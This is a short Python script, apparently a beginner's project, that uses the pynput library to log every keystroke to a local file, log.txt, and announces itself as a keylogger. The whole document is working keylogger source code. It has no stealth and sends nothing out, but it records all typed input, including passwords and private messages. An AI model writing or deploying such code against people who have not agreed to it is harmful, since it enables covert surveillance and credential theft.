from pynput.keyboard import Listener

# Function to log keystrokes 
def log_keystorkes(key):
    key = str(key).replace("'", "") # Clean up key formate  
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n")

# Function to start listening to keystorkes 
def start_logging():
    with Listener(on_press=log_keystorkes) as listener:
        listener.join()

if __name__ == "__main__":
    print("[+] keylogger is running...(press CTRL + C to stop)") 
    start_logging()
